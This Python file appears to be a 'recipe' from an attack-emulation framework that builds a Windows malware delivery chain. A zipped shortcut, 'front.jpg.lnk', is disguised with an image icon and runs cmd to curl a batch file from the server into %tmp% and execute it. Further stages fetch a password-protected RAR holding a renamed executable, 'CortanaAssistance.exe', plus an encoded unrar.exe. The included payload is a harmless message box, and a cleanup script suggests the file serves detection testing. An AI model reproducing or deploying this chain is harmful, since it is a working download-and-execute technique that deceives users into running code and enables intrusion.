from typing import List

from make.lnk.lnk import makeLnk
from make.zip.zip import makeZip
from make.bat.bat import *
from make.rar.rar import makeRar

from helpers import *
from model import *


def pyration16(baseUrl) -> List[AceRoute]:
    routes = []

    # Payload: unrar.txt: unrar.exe base64 encoded
    unrar: AceBytes = readFileContent('recipes/pyration10/unrar.exe')
    unrarB64: AceStr = base64encode(unrar)
    serveHtml: AceRoute = makeAceRoute('/pyration16/unrar.txt', unrarB64, info="b64 of unrar.exe")
    routes.append(serveHtml)

    ## Payload: 
    evilexe: AceBytes = readFileContent('payloads/messagebox.exe')
    evilExeFile: AceFile = makeAceFile('CortanaAssistance.exe', evilexe)
    serveHtml: AceRoute = makeAceRoute('/pyration16/CortanaAssistance.txt', evilexe, info="CortanaAssistance.exe")
    routes.append(serveHtml)

    ## Payload: assist.rar: PW "P@2022": ???
    evilExeFile: AceFile = makeAceFile('CortanaAssistance.exe', evilexe)
    evilexeRar: AceBytes = makeRar([evilExeFile], password='P@2022')
    serveHtml: AceRoute = makeAceRoute('/pyration16/assist.rar', evilexeRar, info="RAR with PW of CortanaAssistance.exe")
    routes.append(serveHtml)

    # Payload: Fake JPG
    pic: AceBytes = readFileContent('recipes/pyration16/front.jpg')
    serveHtml: AceRoute = makeAceRoute('/pyration16/fox_details.txt', pic, info="front.jpg")
    routes.append(serveHtml)

    # Log handler (so no 404 appears)
    serveHtml: AceRoute = makeAceRoute('/pyration16/install/log/', pic, info="Log handler")
    routes.append(serveHtml)
    # Stage 2: BAT
    rendered = renderTemplate('recipes/pyration16/stage2.bat',
        logUrl=baseUrl + '/pyration16/install/log/',
        rarUrl=baseUrl + '/pyration16/unrar.txt',
        assistUrl=baseUrl + '/pyration16/assist.rar',
        cortanaUrl=baseUrl + '/pyration16/cortana/CortanaAssistance.txt'
    )
    stage1bat: AceFile = makeAceFile('stage2.bat', rendered)
    serveHtml: AceRoute = makeAceRoute('/pyration16/login', rendered, info="stage2.bat")
    routes.append(serveHtml)

    # Stage 1: BAT
    rendered = renderTemplate('recipes/pyration16/stage1.bat',
        batUrl=baseUrl + '/pyration16/login?_stage=c',
        picUrl=baseUrl + '/pyration16/fox_details.txt',
    )
    stage1bat: AceFile = makeAceFile('stage1.bat', rendered)
    serveHtml: AceRoute = makeAceRoute('/pyration16/raw/Mb7zPnML', rendered, info="stage1.bat")
    routes.append(serveHtml)

    # Initial Vector: LNK
    args = "/k del %tmp%\\45b8f95j17.txt & del %tmp%\\45b8f95j17.bat & "
    args += "curl {} > %tmp%\\45b8f95j17.txt && ".format(baseUrl + '/pyration16/raw/Mb7zPnML')
    args += "rename %tmp%\\45b8f95j17.txt 45b8f95j17.bat && cmd /c %tmp%\\45b8f95j17.bat"
    lnkData: AceBytes = makeLnk(
        name = "front.jpg.lnk",
        target = "c:\\Windows\\System32\\cmd.exe",
        arguments = args,
        iconPath="C:\\Windows\\System32\\imageres.dll",
        iconIndex=67
    )
    lnkFile: AceFile = makeAceFile('front.jpg.lnk', lnkData)

    # Put LNK into a ZIP
    container: AceBytes = makeZip(
        files = [
            lnkFile,
        ],
    )
    containerFile: AceFile = makeAceFile('documents.zip', container)
    serveHtml: AceRoute = makeAceRoute(
        '/pyration16/pyration16-documents.zip', 
        container, 
        info="Entry", 
        isEntry=True, 
        download=True, downloadName='documents.zip')
    routes.append(serveHtml)

    # cleanup.bat
    cleanupbat: AceBytes = readFileContent('recipes/pyration16/cleanup.bat')
    serveHtml: AceRoute = makeAceRoute(
        '/pyration16/cleanup.bat', 
        cleanupbat,
        isEntry=True, 
        info='Cleanup Script',
        download=True, downloadName="cleanup-pyration16.bat")
    routes.append(serveHtml)

    return routes
